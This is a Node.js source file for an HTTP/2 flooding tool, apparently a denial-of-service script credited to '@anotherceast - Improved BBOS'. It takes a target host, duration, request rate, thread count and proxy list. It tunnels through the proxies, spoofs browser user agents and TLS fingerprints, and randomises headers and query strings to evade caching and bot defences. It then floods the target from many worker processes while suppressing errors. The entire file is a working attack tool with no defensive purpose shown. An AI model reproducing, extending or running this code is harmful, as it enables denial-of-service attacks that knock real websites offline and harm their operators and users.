const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = [
    "TLS_GREASE (0xDADA)",
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384", 
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA",
].join(":");

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

const userAgentPool = [
    {
        ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 129)}.0.0.0 Safari/537.36`,
        secChUa: `"Not;A=Brand";v="24", "Chromium";v="${getRandomInt(120, 129)}", "Google Chrome";v="${getRandomInt(120, 129)}"`,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        acceptLanguage: "en-US,en;q=0.9",
        platform: '"Windows"',
        mobile: "?0"
    },
    {
        ua: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 129)}.0.0.0 Safari/537.36`,
        secChUa: `"Not;A=Brand";v="24", "Chromium";v="${getRandomInt(120, 129)}", "Google Chrome";v="${getRandomInt(120, 129)}"`,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        acceptLanguage: "en-US,en;q=0.9",
        platform: '"macOS"',
        mobile: "?0"
    },
    {
        ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${getRandomInt(115, 123)}.0) Gecko/20100101 Firefox/${getRandomInt(115, 123)}.0`,
        secChUa: null,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        acceptLanguage: "en-US,en;q=0.5",
        platform: '"Windows"',
        mobile: "?0"
    },
    {
        ua: `Mozilla/5.0 (iPhone; CPU iPhone OS 16_${getRandomInt(0, 5)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1`,
        secChUa: null,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        acceptLanguage: "en-US,en;q=0.5",
        platform: '"iOS"',
        mobile: "?1"
    }
];

function getRandomUserAgent() {
    const uaEntry = userAgentPool[Math.floor(Math.random() * userAgentPool.length)];
    const version = getRandomInt(120, 129);
    let ua = uaEntry.ua.replace(/\d{3}\.\d\.\d\.\d/g, `${version}.0.0.0`);
    let secChUa = uaEntry.secChUa;
    if (secChUa) {
        secChUa = secChUa.replace(/\d{3}/g, version);
    }
    return {
        userAgent: ua,
        secChUa: secChUa,
        accept: uaEntry.accept,
        acceptLanguage: uaEntry.acceptLanguage,
        platform: uaEntry.platform,
        mobile: uaEntry.mobile,
    };
}

function generateDynamicHeaders() {
    const getRandomChar = () => {
        const chars = "abcdefghijklmnopqrstuvwxyz";
        return chars[Math.floor(Math.random() * chars.length)];
    };

    const dynamicHeaders = [];
    const timestamp = Date.now().toString().substring(0, 10);
    
    const headerPool = [
        { key: `x-client-session${getRandomChar()}`, value: `session-${randstr(8)}` },
        { key: `sec-ms-gec-version${getRandomChar()}`, value: `v${getRandomInt(1, 5)}.${getRandomInt(0, 9)}` },
        { key: `x-request-data${getRandomChar()}`, value: `data-${randstr(6)}` },
        { key: `x-custom-header${getRandomChar()}`, value: `custom-${randstr(5)}` },
        { key: `sec-fetch-users${getRandomChar()}`, value: `?${Math.random() < 0.5 ? "0" : "1"}` },
        { key: `x-trace-id${getRandomChar()}`, value: `${randstr(10)}-${timestamp}` },
    ];

    const numHeaders = getRandomInt(1, 3);
    for (let i = 0; i < numHeaders; i++) {
        if (Math.random() < 0.6) {
            const header = headerPool[Math.floor(Math.random() * headerPool.length)];
            dynamicHeaders.push([header.key, header.value]);
        }
    }

    for (let i = dynamicHeaders.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [dynamicHeaders[i], dynamicHeaders[j]] = [dynamicHeaders[j], dynamicHeaders[i]];
    }

    return dynamicHeaders;
}

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256", 
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

let SignalsList = sigalgs.join(':');
const ecdhCurve = "X25519:P-256:P-384";

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_TICKET |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_TLSEXT_PADDING |
    crypto.constants.SSL_OP_ALL;

if (process.argv.length < 7) {
    console.log(`Usage: node flood [host] [time] [rps] [thread] [proxyfile]`); 
    process.exit();
}

const secureProtocol = "TLS_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: false, 
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

class NetSocket {
    constructor(){}

    async SOCKS5(options, callback) {
        const address = options.address.split(':');
        socks.createConnection({
            proxy: {
                host: options.host,
                port: options.port,
                type: 5
            },
            command: 'connect',
            destination: {
                host: address[0],
                port: +address[1]
            }
        }, (error, info) => {
            if (error) {
                return callback(undefined, error);
            } else {
                return callback(info.socket, undefined);
            }
        });
    }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        
        const isIPv6Proxy = options.host.includes(':') && options.host.split(':').length > 2;
        const proxyHost = isIPv6Proxy ? `[${options.host}]` : options.host;
        
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const buffer = new Buffer.from(payload);
        
        const connection = net.connect({
            host: options.host,
            port: options.port,
            family: isIPv6Proxy ? 6 : 4 
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true)
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 1000;

if (cluster.isMaster) { 
    console.clear();
    console.log(`@anotherceast - Improved BBOS`);
    console.log(`⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯`.gray);
    console.log(`Target: `.red + process.argv[2].white);
    console.log(`Time: `.red + process.argv[3].white);
    console.log(`Rate: `.red + process.argv[4].white);
    console.log(`Thread: `.red + process.argv[5].white);
    console.log(`ProxyFile: `.red + process.argv[6].white);
    console.log(`⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯`.gray);
    console.log(`recoded shit script idk if it's good or nah`);
    
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 5000);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1)
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    let parsedProxy;
    if (proxyAddr.includes('@')) {
        const authSplit = proxyAddr.split('@');
        const creds = authSplit[0];
        const hostPort = authSplit[1];
        parsedProxy = hostPort.split(':');
        parsedProxy.unshift(creds); // [creds, host, port]
    } else {
        const lastColon = proxyAddr.lastIndexOf(':');
        if (proxyAddr.includes(':') && proxyAddr.split(':').length > 2) {
            const host = proxyAddr.substring(0, lastColon);
            const port = proxyAddr.substring(lastColon + 1);
            parsedProxy = [host, port];
        } else {
            parsedProxy = proxyAddr.split(":");
        }
    }

    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";

    const { userAgent, secChUa, accept, acceptLanguage, platform, mobile } = getRandomUserAgent();

    const generateEnhancedHeaders = () => {
        const baseHeaders = {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 6) + "=" + generateRandomString(5, 10),
            "cache-control": Math.random() < 0.5 ? "no-cache" : "max-age=0",
            "user-agent": userAgent,
            "accept": accept,
            "accept-language": acceptLanguage,
            "accept-encoding": "gzip, deflate, br, zstd",
            "sec-fetch-site": Math.random() < 0.7 ? "none" : "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "upgrade-insecure-requests": "1",
            "priority": "u=0, i" 
        };

        if (secChUa) {
            baseHeaders["sec-ch-ua"] = secChUa;
        }
        baseHeaders["sec-ch-ua-mobile"] = mobile;
        baseHeaders["sec-ch-ua-platform"] = platform;

        const dynamicHeaders = generateDynamicHeaders();
        dynamicHeaders.forEach(([key, value]) => {
            baseHeaders[key] = value;
        });

        return baseHeaders;
    };

    const proxyOptions = {
        host: parsedProxy.length === 3 ? parsedProxy[1] : parsedProxy[0], // Handle auth case
        port: parsedProxy.length === 3 ? ~~parsedProxy[2] : ~~parsedProxy[1],
        address: `${parsedTarget.host}:443`,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error) return;
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ciphers,
            requestCert: true,
            sigalgs: SignalsList,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: false, 
            rejectUnauthorized: false, 
            minVersion: 'TLSv1.3',
            maxVersion: 'TLSv1.3',
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            session: crypto.randomBytes(64), 
            compression: true, 
            requestOCSP: true,
        };
        
        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        
        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setMaxListeners(0);

        let hpack = new HPACK();
        hpack.setTableSize(4096); 
        let client;
        
        const h2Settings = {
            headerTableSize: 4096,
            enablePush: false,
            maxConcurrentStreams: Math.random() < 0.5 ? 1000 : 100,
            initialWindowSize: 6291456,
            maxFrameSize: 16384,
            maxHeaderListSize: 262144
        };

        client = http2.connect(parsedTarget.href, {
            protocol: "https",
            createConnection: () => tlsSocket,
            settings: h2Settings,
            socket: tlsSocket,
        });
        
        client.setMaxListeners(0);
        
        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(15663105, 0); 
        
        const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        const h2_config = [
            [1, 65536],  // SETTINGS_HEADER_TABLE_SIZE
            [2, 0],      // SETTINGS_ENABLE_PUSH
            [4, 6291456], // SETTINGS_INITIAL_WINDOW_SIZE
            [6, 262144]   // SETTINGS_MAX_HEADER_LIST_SIZE
        ];
        
        const frames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 4, encodeSettings(h2_config)),
            encodeFrame(0, 8, updateWindow)
        ];
        
        client.on('connect', async () => {
            const intervalId = setInterval(async () => {
                try {
                    const requests = [];
                    let streamId = 1;
                    
                    if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                        for (let i = 0; i < args.Rate; i++) {
                            const headers = generateEnhancedHeaders();
                            
                            const headerArray = Object.entries(headers);
                            
                            const packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(headerArray)
                            ]);
                            
                            const requestPromise = new Promise((resolve, reject) => {
                                const req = client.request(headers)
                                    .on('response', response => {
                                        req.close();
                                        req.destroy();
                                        resolve();
                                    })
                                    .on('error', () => {
                                        reject(new Error('Request error'));
                                    });
                                
                                req.end();
                                
                                setTimeout(() => {
                                    if (!req.destroyed) {
                                        req.destroy();
                                        reject(new Error('Request timeout'));
                                    }
                                }, 5000);
                            });
                            
                            const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                            requests.push({ requestPromise, frame });
                            streamId += 2;
                        }
                        
                        try {
                            await Promise.allSettled(requests.map(({ requestPromise }) => requestPromise));
                            client.write(Buffer.concat(frames));
                        } catch (error) {
                        }
                    }
                } catch (error) {
                }
            }, 100);
            
            setTimeout(() => {
                clearInterval(intervalId);
                client.close();
            }, 30000);
        });
        
        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
